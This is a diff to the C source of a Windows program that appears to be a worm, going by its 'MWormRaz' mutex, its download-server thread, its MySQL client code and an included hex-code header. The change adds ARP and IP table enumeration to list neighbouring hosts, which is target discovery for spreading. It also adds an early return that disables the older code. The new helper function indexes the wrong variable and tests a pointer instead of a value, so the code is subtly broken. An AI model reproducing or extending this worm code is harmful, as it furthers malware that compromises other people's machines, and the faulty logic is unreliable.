@@ -2,14 +2,16 @@
 //
 
 #include <stdio.h>
+#include <winsock2.h>
 #include <WINDOWS.H>
-#include <winsock.h>
+#include <iphlpapi.h>
 #include <tchar.h>
 #include <io.h>
 #include <time.h>
 #include "mysql.h"
 #include "hex_code.h"
 
+#pragma comment(lib,"Iphlpapi.lib")
 #pragma comment(lib,"libmysql.lib")
 #pragma comment(lib,"ws2_32.lib")
 
@@ -214,10 +216,61 @@ BOOL InitSocket()
 	return TRUE;
 }
 
+PMIB_IPNETTABLE GetArpTable(BOOL bOrder)
+{
+	PMIB_IPNETTABLE pIpNetTable = NULL;
+	DWORD dwActualSize = 0;
+	if (GetIpNetTable(pIpNetTable,&dwActualSize,bOrder) == ERROR_INSUFFICIENT_BUFFER)
+	{
+		pIpNetTable = (PMIB_IPNETTABLE)GlobalAlloc(GPTR,dwActualSize);
+		if (GetIpNetTable(pIpNetTable,&dwActualSize,bOrder) == NO_ERROR)
+			return pIpNetTable;
+		GlobalFree(pIpNetTable);
+	}
+	return NULL;
+}
+
+PMIB_IPADDRTABLE GetIpTable(BOOL bOrder)
+{
+	PMIB_IPADDRTABLE pIpAddrTable = NULL;
+	DWORD dwActualSize = 0;
+	if (GetIpAddrTable(pIpAddrTable,&dwActualSize,bOrder) == ERROR_INSUFFICIENT_BUFFER)
+	{
+		pIpAddrTable = (PMIB_IPADDRTABLE)GlobalAlloc(GPTR,dwActualSize);
+		if (GetIpAddrTable(pIpAddrTable,&dwActualSize,bOrder) == NO_ERROR)
+			return pIpAddrTable;
+		GlobalFree(pIpAddrTable);
+	}
+	return NULL;
+}
+
+BOOL InterfaceIdxToInterfaceIp(PMIB_IPADDRTABLE pIpAddrTable,DWORD dwIndex,DWORD *dwIpAddr)
+{
+	DWORD dwIdx;
+	for (dwIdx = 0; dwIdx < pIpAddrTable->dwNumEntries; dwIdx++)
+	{
+		if (dwIndex == pIpAddrTable->table[dwIndex].dwIndex)
+		{
+			*dwIpAddr = pIpAddrTable->table[dwIndex].dwAddr;
+			if (dwIpAddr != 0)
+				return TRUE;
+			else
+				return FALSE;
+		}
+	}
+	return FALSE;
+}
+
 int _tmain(int argc, _TCHAR* argv[])
 {	
 	HANDLE hMutex;
 	char szHostName[128] = {0};
+
+	PMIB_IPNETTABLE pIpNetTable = NULL;
+	PMIB_IPADDRTABLE pIpAddrTable = NULL;
+	DWORD dwActualSize = 0,dwIpAddr = 0;
+	unsigned int i;
+
 	SetLastError(ERROR_SUCCESS);
 	hMutex = CreateMutexA(NULL,FALSE,"MWormRaz");
 	if (hMutex == NULL)
@@ -229,17 +282,29 @@ int _tmain(int argc, _TCHAR* argv[])
 	{
 		return 0;
 	}
-
-	InitSocket();
-	if (gethostname(szHostName,sizeof(szHostName)))
+	// get arp table
+	pIpNetTable = GetArpTable(TRUE);
+	if (pIpNetTable == NULL)
+		return -1;
+	pIpAddrTable = GetIpTable(TRUE);
+	for (i = 0; i < pIpNetTable->dwNumEntries; ++i)
 	{
-		printf("gethostname error:%d",WSAGetLastError());
-		return 0;
+		dwIpAddr = 0;
+		if (InterfaceIdxToInterfaceIp(pIpAddrTable,pIpNetTable->table[i].dwIndex,&dwIpAddr))
+			printf("[%d]:%s\n",i,inet_ntoa(*(struct in_addr *)&dwIpAddr));
+		else
+			printf("[%d]:Could not convert IP address.\n",i);
 	}
 
-	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)runServer,NULL,0,NULL);
-	mysql_init(&mysql);
+	wait();
+	return 0;
 
+	InitSocket();
+
+	// start download server
+	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)runServer,NULL,0,NULL);
+
+	mysql_init(&mysql);
 
 	do 
 	{
